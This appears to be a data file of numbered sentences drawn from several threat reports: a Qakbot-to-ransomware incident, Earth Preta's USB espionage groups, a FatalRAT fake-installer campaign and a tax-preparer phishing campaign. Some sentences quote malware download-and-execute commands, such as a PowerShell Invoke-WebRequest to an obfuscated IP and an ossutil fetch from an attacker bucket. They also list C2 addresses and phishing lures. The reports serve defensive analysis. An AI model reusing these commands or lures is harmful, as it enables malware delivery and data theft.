Defender, required multiple steps in order to view the commands. ","11461":"Tox5, which appeared to be a component of Cobalt Strike, as well as Cobalt Strike beacon with the name of \"Ticket-5731.xls.\" These files continued to replicate throughout the organization though the use of Server qMessage Block (SMB), eventually spreading to almost every endpoint and server in two of the three domains.","11462":"The attack on the Commerce domain does not appear to have been effective, outside of one host in a training environment.","11463":"Most hosts in the Commerce environment HAD more restrictions placed on their operating system by default which likely contributed to the lack of success by the threat actors in the Commerce environment. ","11464":"EXFILTRATION ","11465":"Once a file server was identified, an FTP connection was established to an external site.","11466":"This was not used for C2 activities but only for receiving the exfiltrated data.","11467":"Suricata logs show that \u201cRClone\u201d was downloaded on the file servers in order to facilitate exfiltration of the logs.","11468":"RClone is designed to transfer large volumes of data from one host to the cloud with ease.","11469":"This legitimate program was abused by the attacker to steal client data. ","11470":"DETECTION AND RESPONSE The most critical asset of the Security Operations Center is the human SOC Analyst. ","11471":"A human can look at the totality of a situation and make a judgement call that no AI or automated process can.","11472":"From the analyst's perspective, the only alert that was generated and brought to the SOC was a Suricata FTP rule looking for CVE 1999-0911, related to an overflow using the MKD command.","11473":"This FTP command is defined as \"...causes the directory specified in the pathname to be created on the server.","11474":"If the specified directory is a relative directory, it is created in the client's current working directory.","11475":"\" Although many old signatures are decommissioned or otherwise suppressed, Quadrant leaves some rules in place as \"hunting\" rules.","11476":"These are more focused on the overall techniques or \"odd\" traffic that could be an indicator of compromise.","11477":"In this case, the analyst investigating the alert observed that this was technically a False Positive, as the command was not used in an abnormal fashion.","11478":"However, looking at the destination, which had not been previously observed in the environment, the file names (which were quite varied), and the volume of the files outbound, the analyst decided to call the client to err on the side of caution.","11479":"Had the analyst not conducted their due diligence or had this archaic signature been suppressed, it is highly likely that this compromise would not have been detected until after the encryption process had begun. ","11480":"The current list of rules developed following this incident can be found in I The alert was submitted at 18:27 EDT on 9\/21\/2022.","11481":"Just over 30 hours after the initial infection. ","11482":"The client determined it to be out of the ordinary but was unaware of the extent of the compromise.","11483":"However, during the course of the evening, it became apparent that something was greatly amiss.","11484":"The following morning, the client\u2019s CISO contacted the Quadrant team to report that there was indeed an active compromise within their environment. ","11485":"The client provided malware samples from the phishing emails and the analysis began.","11486":"Threat hunting was conducted within the logs. ","11487":"A dedicated \u201cout of bands\u201d communications channel was established between Quadrant and the clients. ","11488":"As more evidence was uncovered, the full threat began to be realized. ","11489":"One aspect of the actions taken by the Incident Response team was a live log review.","11490":"The term \"look for anything suspicious\" is often a nightmare of a request, because how does one truly define suspicious without a base line.","11491":"However, with the amount of knowledge of the situation and years of experience on his side, a member of the I.R. team decided to look at the raw logs in real time to see if anything stood out. ","11492":"Windows Event logs and \u201cclipboard\u201d logs are collected using NXLog Enterprise. ","11493":"While clipboard logs are not stored on the local host, they are sent to the Sagan Log Analysis Engine for further analysis and retention. ","11494":"While examining this data, the I.R. team member became aware of the use of RDP by the Threat Actor by observing RDPClip.exe logging that looked, by definition, incredibly suspicious. ","11495":"Among the many \u201cclipboard\u201d logs observed, \"Client.exe -bomb,\" stood out.","11496":"Although the full extent of the command was not realized at the time, due to the implied malice it was decided that now was the time to attempt to purge the threat actor. ","11497":"The Clients response team locked out the accounts that were known to be compromised.","11498":"However, the threat actor had complete control over the environment.","11499":"Following the initial attempt to lock out the threat actor, the threat actor retaliated. ","11500":"This resulted in a catastrophic lockout of the client's staff and administrators. ","11501":"This was not completely unexpected. ","11502":"Knowing that there was an ongoing data exfiltration attempt along with a full network compromise with a relatively short \u201cdwell\u201d time, plans had been put into place to restrict all access to the network in order to mitigate and prevent the threat actor from doing more damage. ","11503":"The client's staff was simply waiting on the \u201corder\u201d to halt the network. ","11504":"After quick conference between Quadrant and the client, all parties agreed and the decision was made: At approximately 8:45pm on September 22, only 56 hours after the initial phishing email had been opened, the physical cables from between the domains as well as their connection to the Internet were pulled. ","11505":"Because of the observation, hunting, and superior teamwork between the Quadrant team and the client, only a handful of ESXi servers were encrypted.","11506":"Had the team not taken action to sever the Internet and domain connections, the encryption command would likely have replicated throughout the Construction and Subsidiary environments.","11507":"With the assistance of a third-party incident response firm and constant ongoing contact with the Quadrant team, the client was able to slowly, systematically, and safely bring their servers on-line while purging any remains of the threat actor over the course of the next two weeks. ","11508":"Ultimately, this was considered a success in defense of the client.","11509":"But there were many lessons learned.","11510":"Through the later review of the logging and after-action analysis of the event, more detections rules have been created to better alert on what visibility does exist in this, and many other, client environments. ","11511":"TECHNICAL ANALYSIS INITIAL ACCESS: QAKBOT INFECTION ","11512":"The two phishing samples provided by the client show two different techniques: Email response as part of an Email Chain: \"Re: RE: Logistics\": ","11513":"The phishing email came from a legitimate vendor \"stoneworkers\".","11514":"The phishing attachment was submitted to the target in a response to an ongoing conversation that was being held between a member of Quadrant\u2019s client and the TPV.","11515":"The attacker submitted the email from \"info[@]stoneworkers[.]org\" while posing as \"jpeterman[@]stoneworkers[.]org\".","11516":"The email had applicable context and the email chain contains back and forth to another member of the TPV as well. ","11517":"Cold Email: \"Solution for Issue 37\": ","11518":"The phishing email came with no pretext from a site not used by the client.","11519":"However, it is important to note that the site seems to be owned by a legitimate venture capital group, which may indicate a compromise of their organization or that the email account was spoofed.","11520":"The attacker submitted the email from \"support[@]capitalizedadventures[.]com\" while posing as \"Jay Peterman\". ","11521":"From the two phishing emails, both attachments contain similar malware.","11522":"Only changes to the filenames and corresponding commands were observed between the two. ","11523":"When downloaded, the initial attachment is a local HTML file.","11524":"The web page claims to be an adobe site and that the attached document is a PDF which is password protected: Using the password \"abc888\" to unzip the attachment, the user is presented with an ISO file.","11525":"The two samples produced different ISO names: Claim_Copy_1796.iso and Claim_Copy_5898.iso. ","11526":"The subdirectories to the fathomed directory, elude, omicron, and shabbily, are all empty as confirmed by navigating to them and running \"ls -a\" and returning no files.","11527":"This was verified through \"du -h\" which resulted in 4.0k size, which is consistent of an empty directory. ","11528":"When opened in a Windows environment the following is displayed: The ISO mounts as a DVD Drive.","11529":"The \"Claim_Copy\" shows the icon for windows file explorer.","11530":"Clicking on these calls the corresponding JavaScript file contained within each iso. ","11531":"In both cases the JavaScript files set several variables before running the \".cmd\" file contained within the ISO.","11532":"This is likely done as a method to avoid detection from Log Analysis Engines, such as the Sagan Engine, as well as other monitoring services such as Microsoft's Defender or Sentinel. ","11533":"The command is called with echo off, so that no text will be displayed to the user.","11534":"Ultimately, this CMD file calls the \"db\" file.","11535":"In both samples, the \"db\" file is not a database, but is the actual Qakbot trojan. ","11536":"Something interesting to note: the \"campus.txt\" contains an excerpt from \"Through the Looking Glass\" by Lewis Carol.","11537":"This inclusion may be to add easily changeable padding to the ISO.","11538":"Doing so would allow the easy addition or subtraction of data in order to change the ISO\u2019s hash value without changing any important content of the executables. ","11539":"Following detonation of Qakbot, the malware copied itself to \"$CURRENTUSER\\AppData\\Roaming\\Microsoft\\Isoaahffo\\djkuuhd.dll,\" as confirmed by the file's hashes shown below, and sets itself to auto run.","11540":"Following this, the malware begins to beacon out to hard coded C2 servers.","11541":"A breakdown of the observed IP\u2019s and their ports can be found in the INDEX A below.","11542":"This contains over 100 IP\u2019s for potential C2 servers. ","11543":"During the initial detonation of 5898, the process imbedded itself into wermgr.exe, the Windows Error Reporting Manager (Process ID 6660). ","11544":"Further analysis of the registry keys added by the sample were able to be decrypted by leveraging the decryption script found at the link \"https:\/\/github.com\/drole\/qakbot-registry-decrypt\".","11545":"These show the full path to the dropped file \"xjkuuhd.dll\" as well as the Qakbot campaign identifier: \"obama206.\" ","11546":"As with the case with other Qakbot investigations, multiple potential IP\u2019s were observed during the testing.","11547":"During the incident, the first warning sign of compromise came from the victims Cisco Advanced Malware Protection alerting.","11548":"Cisco AMP detected an attempt to contact \"76[.]169[.]76[.]44\"[Van Nuys, CA] over TCP port 2222.","11549":"It is interesting to note that other IP\u2019s were attempted to be reached over port TCP 2222, however, this C2 node was the only IP to return any data over TCP port 2222, which may be why this alert triggered.","11550":"According to Suricata logs, this was also the first IP that was reached out to via 2222.","11551":"A later review of the logs revealed that the first attempt to contact the C2 ip\u2019s (\"61[.]70[.]29[.]53\"[Taiwan]). ","11552":"Due to TCP port 2222\u2019s common use as an alternate port for SSH communication, the Malware Analyst recorded a manual SSH connection to the emulated C2 host in order to show the difference between an SSH connection and the connection made by the Malware sample.","11553":"Evidence suggests that the sample does not communicate over SSH and the communication is consistent with HTTP\/S traffic. ","11554":"The malware analyst attempted to connect via SSH to the emulated C2 host.","11555":"Note the first packet from the experimental machine to the emulated C2 device following the 3-way TCP handshake shows header information containing the OpenSSH client information.","11556":"This was produced manually as an example of an SSH connection while SSH was running on the emulated C2 host on port 2222.","11557":"An overview of the lab setup and tools can be found in INDEX B. While continuing to run the SSH client on the emulated C2 device, the malware was detonated on the VM, we can see that the same packet following the 3-way handshake no longer contains SSH information but is detected as a Client Hello. ","11558":"The emulated C2 Server is now running an HTTPS server on TCP port 2222.","11559":"This PCAP above shows the conversation from the 3-way handshake to the resetting of the connection. ","11560":"Following observation of the malware samples, we now know that most of the connection attempts to the C2 IP\u2019s are conducted over TCP port 443.","11561":"Because of the common use of this port, and the use of TLS in these connections, both attempts and the successful connections went undetected by Suricata and Cisco AMP. ","11562":"Many of the connections over 443 resulted in minimal connections consistent with nothing more than TCP negations. ","11563":"However, IP\u2019s \"119[.]42[.]124[.]18\"[Thailand] and \"193[.]3[.]19[.]37\"[Russia] showed multiple packets and data transferred, including the exchange of TLS certificates.","11564":"The size and length of connection indicates that the second stage was downloaded from \"193[.]3[.]19[.]37\"[Russia]. ","11565":"The largest connection between P0 and the C2 domain.","11566":"Because of the amount of data outbound, this also may indicate some data exfiltration or interaction with the downloaded second stage from the C2.

","11723":"These key findings can help intelligence communities and decision-makers in understanding Earth Preta\u2019s capabilities, objectives, and impact on international security and intellectual property.","11724":"With this entry, we hope to emphasize the importance of international cooperation in combating this significant threat. ","11725":"Method and findings We found that some operational part of the collective group were focused on stealing intellectual property and sensitive business information, while others targeted government and diplomatic entities.","11726":"We also found the operations having specific geographical regions for which they tailored their collection requirements. ","11727":"Figure 1.","11728":"Earth Preta\u2019s top 10 targeted industries We used a qualitative approach to identify the collection requirements, methods, and objectives of the operational groups and their respective places in the organization.","11729":"We established links between the operational threat groups by grouping overlaps in victimology and identifying core indicators, such as implants or payloads. Figure 2.","11730":"Earth Preta\u2019s targeted regions Case studies Overlaps Throughout our investigation, we observed several instances where victims were compromised by two groups simultaneously, indicating possible overlaps in collection requirements between these groups.","11731":"While there are no indications of overlaps in individual devices, there are strong indications of targets intersecting, suggesting these groups are pursuing similar objectives.","11732":"Additionally, the overlaps among victims indicate a lack in targeting coordination and\/or planning within the overall groups' leadership or management. ","11733":"These targeting overlaps have been observed in multiple groups, such as Groups 724, 1358, and 5171.","11734":"Since these groups operate across a variety of sectors, it is likely that the overlap in collection requirements is the result of similar objectives rather than coordination between the toolset and collected materials.","11735":"However, we have not been able to identify any evidence of coordination between these groups or a shared toolset. ","11736":"Infection and exfiltration vectors Group 5171's exfiltration methods are sophisticated and designed to avoid detection.","11737":"Several victims in key countries, such as Singapore, Vietnam, Netherlands, Ghana, and Myanmar, have indications of files exfiltrated via a dedicated USB mass storage device.","11738":"For instance, in January 2023, a device from Vietnam loaded the Adobe CEF Helper under the path <C:\\Users\\XXX\\AAM","11739":"UpdatesXXX\\AAM Updates.exe>","11740":"and exfiltrated documents to drive F:.","11741":"The same device also carried out another collection in December 2022, where data was copied from folder <C\\:$RECYCLE.BIN\\S-XXXXX$XXXH.pdf>, indicating that the user deleted the collected data. ","11742":"Roaming endpoint attacks In contrast to Group 5171, Group 1358\u2019s uses malicious USB mass storage devices as its primary method of compromise.","11743":"Our analysis indicated that toward the end of 2022 and early 2023, all documented intrusions from Group 1358 used USB mass storage devices.","11744":"In addition, there were multiple instances where initial compromise occurred while the assets of the target were roaming abroad through a technique known as the \u201ctraveling laptop attack.\u201d ","11745":"Table 1.","11746":"Small sample of Earth Preta\u2019s traveling laptop attack deployments and victims APT subgroups responsible for attack Victim organization\u2019s industry, country Country where attack was deployed from Group 724 Maritime, Australia Papua New Guinea Group 1358 Construction, France Togo Group 5171 NGOs, Africa N\/A This mix of traditional intelligence trade craft and cyber techniques could mean that these groups have access to advanced resources and support from nation states, since such techniques are not typically available to independent hackers.","11747":"Moreover, this approach could signify the growing convergence of cyber- and physical security as cyberattacks continue to move beyond digital systems and into the physical world. ","11748":"Operation groups While this is not a comprehensive list, we summarize and attribute the operational functions to specific groups as contributing units to Earth Preta\u2019s cyberespionage activities and deployments.","11749":"As we continue following this campaign and track its activities, these group names will be updated accordingly once analyses and attribution are confirmed. ","11750":"Group 724 Group 724 is possibly related to Earth Preta.","11751":"The group utilizes sideloading with Adobe CEF Helper to establish a persistent foothold in the user's home directory, employing a naming convention with one of the following patterns: AcroRD32XXX AAM UpdatesXXX AcrobatXXX Eset Malware ProtectionXXX \"XXX\" denotes three random letters.","11752":"The group uses a USB drive as an entry point into a target's system, indicating its preference for leveraging physical vectors for intrusion.","11753":"This group is considered one of the most dangerous in the Southeast Asian region and has been known to target a myriad of organizations. ","11754":"Group 724 also appears to be focused on compromising targets in specific industries and countries.","11755":"The group has been observed targeting sectors such as finance, government, manufacturing, fabrication, construction, energy, transportation, air traffic, and food production.","11756":"This targeted approach indicates that the group has developed a clear understanding of the vulnerabilities and high-value assets present in these industries.","11757":"The significant level of proliferation suggests that it is well-funded and includes a large team of skilled individuals, likely enabling it to carry out attacks on multiple targets simultaneously. ","11758":"The group uses customized USB storage devices tailored to individual targets as part of their intrusion tactics.","11759":"These customized devices appear to be carefully crafted to bypass security measures and appear legitimate to the target.","11760":"With this preference for a physical entry vector, the group can increase the chances of a successful intrusion and maintain its covert operations.","11761":"This technique highlights the level of sophistication and planning that goes into Group 724's attacks. ","11762":"Group 1358 Group 1358 is a highly sophisticated threat actor that employs advanced tactics and techniques to infiltrate and compromise a wide range of targets worldwide.","11763":"The group has been observed utilizing Avast\u2019s WSC DLL for sideloading, a technique leveraging the Windows Management Instrumentation (WMI) service to execute malicious code.","11764":"This group is potentially composed of several operating groups utilizing the same tools and techniques.","11765":"Persistence is established at ProgramData\\AvastSvcXXX, where \"XXX\" represents three random letters.","11766":"The group uses generic USB mass storage devices as an entry point, suggesting that they prioritize ease of access over customization. ","11767":"This group\u2019s choice of malware is PlugX, an older and well-known remote access tool.","11768":"Despite its age, PlugX remains an effective tool for threat actors due to its flexibility and evasion capabilities.","11769":"The group's victimology is extensive, targeting organizations across various sectors globally.","11770":"However, recent observations suggest that the group has shifted its collection efforts towards maritime-related information since December 2022.","11771":"Targets have included shipping information, sea vessel movements, border and immigration control, export-related government agencies, food production, and humanitarian groups.","11772":"While some of the targets are related to maritime research and development, most of the information we found as targeted pertain to operational maritime information, even to the extent of compromising specific vessels or tugboat companies. ","11773":"Exfiltration methods utilized involve the use of USB sticks that are plugged in, enabling the PlugX tool to copy all collected data into a previously known and expected USB stick.","11774":"This technique allows the group to remain undetected and avoid detection by traditional security measures. ","11775":"Group 5171 Group 5171 is a threat actor that utilizes advanced techniques to infiltrate and compromise targets across the Middle East and Europe.","11776":"The group uses DLL sideloading with Adobe CEF Helper and establishes persistence in the RECYCLERS.BIN folder.","11777":"In addition, the group also employs USB-based data exfiltration as part of their tactics. ","11778":"Group 5171 differentiates itself from other threat actors with their use of the travelling laptop attack.","11779":"This technique involves infecting a laptop with malicious code in transit.","11780":"Usually, the device will be travelling as part of a routine work travel and upon return to the origin country, a more elaborate exploitation and lateral movement can be initiated.","11781":"This method allows the group to bypass traditional security measures and gain access to their targets undetected. ","11782":"Sectoral targets of Group 5171 are spread out, indicating that the group does not focus on specific sectors but rather adopts a more opportunistic approach.","11783":"However, observing victims\u2019 business verticals and sectors indicate that Group 5171\u2019s collection efforts show a high level of interest in research and development related to IT solutions, materials manufacturing and fabrication, energy production and synthetization, air travel, and space.

","11899":"Key points of the blogpost: The attackers purchased advertisements to position their malicious websites in the \u201csponsored\u201d section of Google search results.","11900":"We reported these ads to Google and they were promptly removed. ","11901":"The websites and installers downloaded from them are mostly in Chinese and in some cases falsely offer Chinese language versions of software that is not available in China. ","11902":"We observed victims mostly in Southeast and East Asia, suggesting that the advertisements were targeting that region. ","11903":"We observed these attacks between August 2022 and January 2023, but according to our telemetry previous versions of the installers have been used since at least May 2022. ","11904":"None of the malware or network infrastructure used in this campaign has been matched to known activities of any named groups, so for now we have not attributed this activity to any known group. ","11905":"Victimology Figure 1 shows a heatmap with the countries where we detected the attacks between August 2022 and January 2023.","11906":"Most of the attacks affected users in Taiwan, China and Hong Kong. ","11907":"Figure 1.","11908":"Countries where we detected the attacks between August 2022 and January 2023 We also observed a small number of cases in: Malaysia Japan The Philippines Thailand Singapore Indonesia Myanmar Attack overview A simplified overview of the attack is shown in Figure 2.","11909":"A chain of multiple components ultimately installs the FatalRAT malware that was described by AT&T researchers (@attcyber) in August 2021. ","11910":"Figure 2.","11911":"Simplified overview of the attack Fake websites ","11912":"The attackers registered various domain names that all pointed to the same IP address: a server hosting multiple websites that download trojanized software.","11913":"Some of these websites look identical to their legitimate counterparts but deliver malicious installers instead.","11914":"The other websites, possibly translated by the attackers, offer Chinese language versions of software that is not available in China, such as Telegram, as shown in Figure 3. Figure 3.","11915":"Fake Telegram website that delivers the FatalRAT malware We observed malicious websites and installers for these applications, roughly in order of popularity: Chrome Firefox Telegram WhatsApp Line Signal Skype Electrum Bitcoin wallet Sogou Pinyin Method, a Chinese Pinyin input method editor Youdao, a dictionary and translation application WPS Office, a free office suite You can see other fake websites in the gallery shown in Figure 4 (click on an image to enlarge it).","11916":"Apart from electrumx[.]org, a fake website in English for the Electrum Bitcoin wallet, all the other websites are in Chinese, suggesting that the attackers are mostly targeting Chinese speakers. ","11917":"Figure 4.","11918":"Fake websites created by the attackers to deliver malicious installers (click to enlarge) ","11919":"While in theory there are many possible ways that potential victims can be directed to these fake websites, a news site reported (English version here) that they were being shown an advertisement that led to one of these malicious websites when searching for the Firefox browser in Google.","11920":"We couldn\u2019t reproduce such search results, but believe that the ads were only served to users in the targeted region.","11921":"An example is shown in Figure 5 (image from the original post above).","11922":"We reported the websites to Google and the ads were taken down. ","11923":"Figure 5.","11924":"Search results for Firefox, with a fake website advertised (image credit: landiannews.com) ","11925":"Given the fact that many of the domain names that the attackers registered for their websites are very similar to the legitimate domains, it is also possible that the attackers rely on typosquatting as well to attract potential victims to their websites.","11926":"Some examples are: You\u2019ll find the rest of the domain names that we observed in the IoCs section. ","11927":"Installers The installers downloaded from the fake websites are not hosted on the same server as the websites, but in the Alibaba Cloud Object Storage Service.","11928":"They are digitally signed MSI files (see the Certificates section) created with Advanced Installer.","11929":"Figure 6 shows the malicious installers that the attackers uploaded to the cloud storage on January 6th, 2023. ","11930":"Figure 6.","11931":"Malicious installers uploaded by the attackers to their cloud storage on January 6th, 2023 When these installers are executed, they usually: Drop and execute the malicious loader, and files needed to run the FatalRAT malware, in the %PROGRAMDATA%\\Progtmy directory. ","11932":"Drop the malicious updater and related files in the %PROGRAMDATA%\\Progtmy\\0 directory.

","11937":"Drop and execute the legitimate installer in C:\\Program Files\\Common Files (see CommonFiles64Folder). ","11938":"Create scheduled tasks to execute the loader and updater components. ","11939":"The malware is run by side-loading a malicious DLL, libpng13.dll, which is used by sccs.exe (Browser Support Module), a legitimate executable developed by Xunlei.","11940":"The original libpng13.dll is also included in the installer package (renamed to what appears to be a random name) because the malicious DLL forwards its exported functions to the original DLL.","11941":"Some of the forwarded exports in the malicious DLL are shown in Figure 7.","11942":"The image shows that the original DLL was renamed to BHuedjhd.dll in this example and that the malicious DLL was compiled as Dll22.dll. ","11943":"Figure 7.","11944":"Part of the exported functions in the malicious DLL that are forwarded to the original The malware updater is executed in a similar manner, by side-loading dr.dll, used by a legitimate, signed binary developed by Tencent.","11945":"The malicious DLL is very simple and executes OSSUTIL (included in the installer package as ssu.exe) to download files from an attacker-controlled bucket in Alibaba Cloud.","11946":"The command executed by the DLL is: cmd \/C","11947":"\u201cC:\\ProgramData\\Progtmy\\2\\ssu.exe cp -r oss:\/\/occ-a1\/dll\/3\/ C:\\ProgramData\\Progtmy\\ \u2013update\u201d This should update files in the %PROGRAMDATA%\\Progtmy local directory from the remote bucket occ-a1 (a different bucket than the ones used to store the installers, but in the same account), but it doesn\u2019t work in any of the installers that we analyzed because the %PROGRAMDATA%\\Progtmy\\2 subdirectory doesn\u2019t exist (it should be subdirectory 0, created by the installer). ","11948":"The attackers made the same mistake with the scheduled tasks created for the updater, as the execution path also refers to a subdirectory 2 that doesn\u2019t exist.","11949":"In most cases, four scheduled tasks are created: two for the RAT (one set to execute periodically and the other whenever any user logs into the PC) and two for the updater.","11950":"The names of the tasks are based in the Windows build number and the name of the computer, as shown in Figure 8. Figure 8.","11951":"Scheduled tasks created by the malicious installers Loaders The loader \u2013 libpng13.dll \u2013 is a very simple component that opens and executes in memory a file named Micr.jpg, located in the same directory as the DLL.","11952":"The attackers have obfuscated the loader with many calls to a function that just prints some hardcoded values.","11953":"It\u2019s possible that this behavior was used to avoid being detected by security solutions or to complicate the analysis of the DLL. ","11954":"Figure 9 shows an example of the obfuscated code on the left and the deobfuscated code on the right. ","11955":"Figure 9.","11956":"Part of the decompiled code for libpng13.dll on the left and on the right the same code deobfuscated Micr.jpg is actually shellcode that also contains an embedded DLL.","11957":"The purpose of this shellcode is to load and execute in memory the embedded DLL by calling an export function of the DLL named SignalChromeElf.","11958":"Before the execution of this export function, the shellcode reconstructs the imports table of the DLL and calls the DllEntryPoint, which simply invokes the Windows API function DisableThreadLibraryCalls as a way to increase the stealthiness of the DLL. SignalChromeElf essentially will decrypt, load, and execute an encrypted payload located in the embedded DLL.","11959":"This encrypted payload is the FatalRAT malware, and after its decryption the DLL will find the address of an export function called SVP7, which contains the entry point of the malware, and call it, passing the encrypted configuration of FatalRAT as an argument. ","11960":"The function in the embedded DLL that decrypts the payload is the same as the function used in FatalRAT to decrypt its configuration.","11961":"An example of this function is shown in Figure 10. ","11962":"FatalRAT FatalRAT is a remote access trojan documented in August 2021, by AT&T Alien Labs.","11963":"This malware provides a set of functionalities to perform various malicious activities on a victim\u2019s computer.","11964":"As an example, the malware can: Capture keystrokes Change the victim\u2019s screen resolution Terminate browser processes and steal or delete their stored data.","11965":"The targeted browsers are: Chrome Firefox QQBrowser Sogou Explorer Download and execute a file Execute shell commands This malware contains various checks to determine whether it\u2019s running in a virtualized environment.","11966":"Depending on its configuration, these checks may be executed or not. ","11967":"From our own analysis we were able to determine that the FatalRAT version used in this campaign is very similar to the one documented by AT&T in their blogpost, so we won\u2019t go into more details.","11968":"A comparison of them is shown in Figure 11, and Figure 10 shows the decompiled code used to decrypt strings in the FatalRAT samples from this campaign, which is the same as the one described by AT&T. Figure 10.","11969":"Decompiled code of a function used by a FatalRAT sample to decrypt its configuration strings Figure 11.","11970":"BinDiff comparison between a FatalRAT sample analyzed by AT&T and the FatalRAT sample found in this campaign Previous version We found a previous version of the malicious installer that the attackers have used since at least May 2022.","11971":"Unlike the installers that we described previously, this version contains an XOR-encrypted payload, divided into three files: Micr.flv, Micr2.flv, and Micr3.flv, each file encrypted with a different, single byte XOR key.","11972":"Once decrypted, the content of the three files is concatenated, forming shellcode that contacts a C&C server to download and execute further shellcode. ","11973":"The loader DLL in this case is named dr.dll \u2013 the same name that is used for the update mechanism in later versions of the installer, side-loaded by the same legitimate executable.","11974":"Given that this older version doesn\u2019t seem to have an updater, we believe that the attackers have replaced it with the new version of the installer since August 2022. ","11975":"Twitter user Jirehlov Solace reported other versions of the installers starting in May 2022, as can be seen in this thread.","11976":"Although some of those installers are the same as ones in this report, it seems that most of them are different, compiled as EXE files (not MSI installers) and using a variety of software packers.","11977":"Those samples are probably connected with Operation Dragon Breath as described by Qi An Xin in May 2022. ","11978":"Conclusion The attackers have expended some effort regarding the domain names used for their websites, trying to be as similar to the official names as possible.","11979":"The fake websites are, in most cases, identical copies of the legitimate sites.","11980":"As for the trojanized installers, they install the actual application that the user was interested in, avoiding suspicion of a possible compromise on the victim\u2019s machine.","11981":"For all of these reasons, we see how important it is to diligently check the URL that we are visiting before we download software.","11982":"Even better, type it into your browser\u2019s address bar after checking that it is the actual vendor site. ","11983":"Since the malware used is this campaign, FatalRAT, contains various commands used to manipulate data from different browsers, and the victimology is not focused on a particular type of user, anyone can be affected.","11984":"It is possible that the attackers are solely interested in the theft of information like web credentials to sell them on underground forums or to use them for another type of crimeware campaign, but for now specific attribution of this campaign to a known or new threat actor is not possible.

","12047":"At least two organizations in that industry, both Sophos customers, reported the unusual attack to us in late February and early March, as tax preparers are entering the busiest part of the season in the United States.","12048":"(The tax filing deadline this year is April 17, 2023.) ","12049":"The attack begins with an email that purports to solicit business from the tax preparation firm.","12050":"The initial message to the target is benign, with a subject line of Prospective Client Enquiries containing nothing more than an introduction and a request for information about \u201conboarding new clients.\u201d ","12051":"The email sender goes on to claim that \u201cThe CPA I used last year is retired, so here I am on the lookout for a new firm to work with.\u201d ","12052":"Responding to the hook with a bigger hook If the target responds to this initial solicitation, the sender then sends a follow-up email with a link to a password-protected Zip file hosted on a cloud storage service.","12053":"The Zip archive has a filename that includes the last name of the fictitious person whose purportedly sent the initial email message. ","12054":"In each of the messages we saw targeting different accounting firms, the attacker used different names, such as Rodney Williamson or Sarah Knapp. ","12055":"The fake sender used the same password of Fresh@123 for the Zip archive in the samples we obtained.","12056":"Because the attacker only sends the link to a CPA who responds to the initial email message, very few of them were caught in spam traps.","12057":"The samples we obtained had been submitted to us only after the targets realized they were being attacked. ","12058":"The sender was very conversational and personable in the messages, helpfully offering that the Zip archive contains \u201cin addition to my tax transcripts for the past two years\u2026a copy of my driver\u2019s license.\u201d","12059":"The attacker also asks the target \u201cWould you be available for a quick telephone call on Friday?\u201d","12060":"Whoever crafted the messages has a good grasp of English-language euphemisms and tax-filing vernacular.","12061":"These messages, with a few very minor spelling or grammar errors, were very hard to discern from ones that might be sent by a legitimate, prospective client of a tax firm. ","12062":"Infection process based on deception ","12063":"If the first stage of the process involves convincing the accounting professional to download and open the linked Zip archive, the next phase is completely out of the tax preparer\u2019s control. ","12064":"The Zip archive contains two files: A Windows Shortcut (a .LNK file), and a benign decoy attachment.","12065":"In the examples we received, one Zip contained a benign file named screenshot1242.jpeg and another contained a file named privatecopy.pdf. ","12066":"Both of these files were the same three minute long MP3 audio recording \u2013 a file that sounds like someone playing an Oud, the stringed instrument similar to a lute used widely in the middle east. ","12067":"When someone tries to double-click these decoy files, Windows (or the application mapped to the relevant filetype) throws an error because the file isn\u2019t the type of file it appears to be.","12068":"Adobe Reader or a photo viewing program can\u2019t open the file. ","12069":"The target would then, naturally, double click the other file in the Zip archive \u2014 a Windows Shortcut (.LNK file) labeled with a PDF file suffix and with an icon that makes it appear to be a PDF document. ","12070":"Unusually, the Windows shortcut has been manipulated in such a way that Windows seems to think that it is a VBScript Script File in the shortcut\u2019s properties sheet. ","12071":"The action taken by the shortcut is rendered not visible in the Properties sheet, either, in what appears to be a novel, malicious use of an exploit first publicly disclosed a year ago in a blog post by researcher @x86matthew, who works for the UK-based offensive security research company MDSec.","12072":"The attackers have crafted the shortcut, by prepending a large number of space characters to the Target field in the properties, so that the Target field appears blank. ","12073":"However, when viewed using a hex editor, the text content of the shortcut is rendered visible.","12074":"It contains a PowerShell command that looks like the following: Invoke-WebRequest http:\/\/0x[two hex bytes].[eight digits]\/fresh\/fordl.vbs -OutFile","12075":"C:\\Windows\\Tasks\\[eight letters].vbs The shortcut command pulls down a Visual Basic script, drops it into the C:\\Windows\\Tasks folder, and executes it.","12076":"A second command appended to the first drops an actual PDF document (of someone\u2019s IRS form W-2, 1099, or 1040) into the same location and opens it as well, as a decoy. ","12077":"The crafting of the URL was somewhat unique.","12078":"The attacker seems to have made a mashup of two different formats of so-called \u201cdotless\u201d IP address (an unusual combo of the hex and \u201cdword\u201d types of dotless IPs) into a combination that isn\u2019t human-readable, but that networked applications like PowerShell can understand and interpret as valid IPv4 addresses. ","12079":"The script shown above uses the address 0xC2.11808979 in the URL, which translates to the IPv4 address 194.180.48.211.","12080":"We also discovered scripts that pointed to malicious files hosted on the addresses 0x6D.13561923 (109.206.240.67) and 0x05.526436 (5.8.8.100). ","12081":"All of the servers hosting the malware hosted them inside of open directories.","12082":"We found 29 different varieties of the VBS and 90 other encrypted and unencrypted payloads hosted in these locations.","12083":"There may be others. ","12084":"A heavily obfuscated VBS ","12085":"The initial infector is a Visual Basic script, heavily obfuscated, and very large at more than 200KB in size.","12086":"A block of base64-encoded, encrypted data comprises almost 150KB of that script, along with code that decodes and decrypts the block of base64. ","12087":"The VBS contains two large variables.","12088":"In the script we analyzed, these were named Ir8 and O7, respectively, but although the variable names were slightly modified in each variant of the script we examined, the overall flow was the same.","12089":"These work in tandem to insert data into the Windows Registry and execute PowerShell commands. ","12090":"When decoded, the content of the Ir8 variable (a segment of which is shown below) turns out to be just another encoded PowerShell script, which the VBS decodes and then executes. ","12091":"The PowerShell script decoded from the Ir8 variable uses Reflection.","12092":"Assembly to load the final payload into memory from a Registry value without writing it to disk.","12093":"The script (shown in part, below) converts several small strings to bytes, concatenates the output, performs a BXOR to decode the bytes, and then converts those bytes to ASCII text, before executing them. ","12094":"And the content loaded out of the Registry?","12095":"That\u2019s what comes from the O7 variable (shown in part, below, because it is too large to fit on one screenshot).","12096":"The concatenated segments of base64 data from O7 get inserted into the Registry, for the Ir8 script to decode. ","12097":"Post-infection, the machine will have an instance of an otherwise benign Windows binary running.","12098":"On one machine, we found that the malware injected itself, using process hollowing, into ielowutil.exe, used by the now defunct Internet Explorer browser for tuning the microphone settings in the browser.","12099":"But the malware doesn\u2019t exclusively inject its code into this exe; Other now-defunct Internet Explorer components were also observed being abused 